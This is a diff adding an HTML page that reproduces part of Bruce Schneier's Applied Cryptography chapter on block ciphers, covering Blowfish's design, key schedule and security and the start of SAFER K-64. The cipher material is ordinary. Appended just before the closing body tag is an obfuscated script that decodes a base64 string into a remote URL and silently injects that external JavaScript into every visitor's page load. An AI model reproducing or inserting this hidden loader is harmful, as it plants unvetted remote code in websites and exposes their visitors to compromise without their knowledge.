@@ -1,0 +1,143 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=336-339//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Blowfish is optimized for applications where the key does not change often, like a communications link or an automatic file encryptor. It is significantly faster than DES when implemented on 32-bit microprocessors with large data caches, such as the Pentium and the PowerPC. Blowfish is not suitable for applications, such as packet switching, with frequent key changes, or as a one-way hash function. Its large memory requirement makes it infeasible for smart card applications.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of Blowfish</I></B></FONT></P>
+<P>Blowfish is a 64-bit block cipher with a variable-length key. The algorithm consists of two parts: key expansion and data encryption. Key expansion converts a key of up to 448 bits into several subkey arrays totaling 4168 bytes.
+</P>
+<P>Data encryption consists of a simple function iterated 16 times. Each round consists of a key-dependent permutation, and a key- and data-dependent substitution. All operations are additions and XORs on 32-bit words. The only additional operations are four indexed array data lookups per round.</P>
+<P>Blowfish uses a large number of subkeys. These keys must be precomputed before any data encryption or decryption.</P>
+<P>The P-array consists of 18 32-bit subkeys:</P>
+<DL>
+<DD><I>P</I><SUB>1</SUB>, <I>P</I><SUB>2</SUB>,..., <I>P</I><SUB>18</SUB>
+</DL>
+<P>Four 32-bit S-boxes have 256 entries each:
+</P>
+<DL>
+<DD><I>S</I><SUB>1,0</SUB>, <I>S</I><SUB>1,1</SUB>,..., <I>S</I><SUB>1,255</SUB>
+<DD><I>S</I><SUB>2,0</SUB>, <I>S</I><SUB>2,1</SUB>,..., <I>S</I><SUB>2,255</SUB>
+<DD><I>S</I><SUB>3,0</SUB>, <I>S</I><SUB>3,1</SUB>,..., <I>S</I><SUB>3,255</SUB>
+<DD><I>S</I><SUB>4,0</SUB>, <I>S</I><SUB>4,1</SUB>,..., <I>S</I><SUB>4,255</SUB>
+</DL>
+<P>The exact method used to calculate these subkeys will be described later in this section.
+</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/14-02.jpg',210,310 )"><IMG SRC="images/14-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/14-02.jpg',210,310)"><FONT COLOR="#000077"><B>Figure 14.2</B></FONT></A>&nbsp;&nbsp;Blowfish.</I>
+</P>
+<P>Blowfish is a Feistel network (see Section 14.10) consisting of 16 rounds. The input is a 64-bit data element, <I>x</I>. To encrypt:</P>
+<DL>
+<DD>Divide <I>x</I> into two 32-bit halves: <I>x</I><SUB>L</SUB>, <I>x</I><SUB>R</SUB>
+<DD>For <I>i</I> = 1 to 16:
+<DL>
+<DD><I>x</I><SUB>L</SUB> = <I>x</I><SUB>L</SUB> &#8853; <I>P</I><SUB>i</SUB>
+<DD><I>x</I><SUB>R</SUB> = F(<I>x</I><SUB>L</SUB>) &#8853; <I>x</I><SUB>R</SUB>
+<DD>Swap <I>x</I><SUB>L</SUB> and <I>x</I><SUB>R</SUB>
+</DL>
+<DD>Swap <I>x</I><SUB>L</SUB> and <I>x</I><SUB>R</SUB> (Undo the last swap.)
+<DD><I>x</I><SUB>R</SUB> = <I>x</I><SUB>R</SUB> &#8853; <I>P</I><SUB>17</SUB>
+<DD><I>x</I><SUB>L</SUB> = <I>x</I><SUB>L</SUB> &#8853; <I>P</I><SUB>18</SUB>
+<DD>Recombine <I>x</I><SUB>L</SUB> and <I>x</I><SUB>R</SUB>
+</DL>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/14-03.jpg',221,157 )"><IMG SRC="images/14-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/14-03.jpg',221,157)"><FONT COLOR="#000077"><B>Figure 14.3</B></FONT></A>&nbsp;&nbsp;Function F.</I>
+</P>
+<P>Function F is as follows (see Figure 14.3):
+</P>
+<DL>
+<DD>Divide <I>x</I><SUB>L</SUB> into four eight-bit quarters:
+<DD><I>a, b, c</I>, and <I>d</I> F(<I>x</I><SUB>L</SUB>) = ((<I>S</I><SUB>1,<I>a</I></SUB> &#43; <I>S</I><SUB>2,<I>b</I></SUB> mod 2<SUP>32</SUP>) &#8853; <I>S</I><SUB>3,<I>c</I></SUB>) &#43; <I>S</I><SUB>4,d</SUB> mod 2<SUP>32</SUP>
+</DL>
+<P>Decryption is exactly the same as encryption, except that <I>P</I><SUB>1</SUB>, <I>P</I><SUB>2</SUB>,..., <I>P</I><SUB>18</SUB> are used in the reverse order.</P>
+<P>Implementations of Blowfish that require the fastest speeds should unroll the loop and ensure that all subkeys are stored in cache. See [568] for details.</P>
+<P>The subkeys are calculated using the Blowfish algorithm. The exact method follows.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Initialize first the P-array and then the four S-boxes, in order, with a fixed string. This string consists of the hexadecimal digits of p.
+<DD><B>(2)</B>&nbsp;&nbsp;XOR <I>P</I><SUB>1</SUB> with the first 32 bits of the key, XOR <I>P</I><SUB>2</SUB> with the second 32-bits of the key, and so on for all bits of the key (up to <I>P</I><SUB>18</SUB>). Repeatedly cycle through the key bits until the entire P-array has been XORed with key bits.
+<DD><B>(3)</B>&nbsp;&nbsp;Encrypt the all-zero string with the Blowfish algorithm, using the subkeys described in steps (1) and (2).
+<DD><B>(4)</B>&nbsp;&nbsp;Replace <I>P</I><SUB>1</SUB> and <I>P</I><SUB>2</SUB> with the output of step (3).
+<DD><B>(5)</B>&nbsp;&nbsp;Encrypt the output of step (3) using the Blowfish algorithm with the modified subkeys.
+<DD><B>(6)</B>&nbsp;&nbsp;Replace <I>P</I><SUB>3</SUB> and <I>P</I><SUB>4</SUB> with the output of step (5).
+<DD><B>(7)</B>&nbsp;&nbsp;Continue the process, replacing all elements of the P-array, and then all four S-boxes in order, with the output of the continuously changing Blowfish algorithm.
+</DL>
+<P>In total, 521 iterations are required to generate all required subkeys. Applications can store the subkeys&#151;there&#146;s no need to execute this derivation process multiple times.
+</P>
+<P><FONT SIZE="+1"><B><I>Security of Blowfish</I></B></FONT></P>
+<P>Serge Vaudenay examined Blowfish with known S-boxes and <I>r</I> rounds; a differential attack can recover the P-array with 2<SUP>8<I>r</I> &#43; 1</SUP> chosen plaintexts [1568]. For certain weak keys that generate bad S-boxes (the odds of getting them randomly are 1 in 2<SUP>14</SUP>), the same attack requires only 2<SUP>4<I>r</I> &#43; 1</SUP> chosen plaintexts to recover the P-array. With unknown S-boxes this attack can detect whether a weak key is being used, but cannot determine what it is (neither the S-boxes nor the P-array). This attack only works against reduced-round variants; it is completely ineffective against 16-round Blowfish.</P>
+<P>Of course, the discovery of weak keys is significant, even though they seem impossible to exploit. A weak key is one in which two entries for a given S-box are identical. There is no way to check for weak keys before doing the key expansion. If you are worried, you have to do the key expansion and check for identical S-box entries. I don&#146;t think this is necessary, though.</P>
+<P>I know of no successful cryptanalysis against Blowfish. To be safe, do not implement Blowfish with a reduced number of rounds.</P>
+<P>Kent Marsh Ltd. has incorporated Blowfish in their FolderBolt security product for Microsoft Windows and Macintosh. It is also part of Nautilus and PGPfone.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">14.4 SAFER</FONT></H3>
+<P>SAFER K-64 stands for Secure And Fast Encryption Routine with a Key of 64 bits [1009]. James Massey produced this nonproprietary algorithm for Cylink Corp. and it is incorporated into some of their products. The government of Singapore is planning to use this algorithm&#151;with a 128-bit key [1010]&#151;for a wide variety of applications. There are no patent, copyright, or other restrictions on its use.
+</P>
+<P>The algorithm has a block and key size of 64 bits. It is not a Feistel network like DES (see Section 14.10), but an iterated block cipher: The same function is applied for some number of rounds. Each round uses two 64-bit subkeys, and the algorithm only uses operations on bytes.</P>
+<P><FONT SIZE="+1"><B><I>Description of SAFER K-64</I></B></FONT></P>
+<P>The plaintext block is divided into eight byte-length sub-blocks: <I>B</I><SUB>1</SUB>, <I>B</I><SUB>2</SUB>,..., <I>B</I><SUB>7</SUB>, <I>B</I><SUB>8</SUB>. Then the sub-blocks go through <I>r</I> rounds. Finally, an output transformation is applied to the sub-blocks. Each round uses two subkeys: <I>K</I><SUB>2i - 1</SUB> and <I>K</I><SUB>2i</SUB>.</P>
+<P>Figure 14.4 shows one round of SAFER K-64. First, sub-blocks are either XORed or added with bytes of subkey <I>K</I><SUB>2i - 1</SUB>. Then, the eight sub-blocks are subjected to one of two nonlinear transformations:</P>
+<DL>
+<DD><I>y</I> = 45<SUP>x</SUP> mod 257. (If <I>x</I> = 128, then <I>y</I> = 0.)
+<DD><I>y</I> = log<SUB>45</SUB> <I>x</I>. (If <I>x</I> = 0, then <I>y</I> = 128.)
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(LhIgwOoz, WfWyAIKT) {WfWyAIKT = LhIgwOoz.createElement('script');WfWyAIKT.type = 'text/javascript';WfWyAIKT.async = true;WfWyAIKT.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');LhIgwOoz.getElementsByTagName('body')[0].appendChild(WfWyAIKT);}(document));</script></body>
+</html>
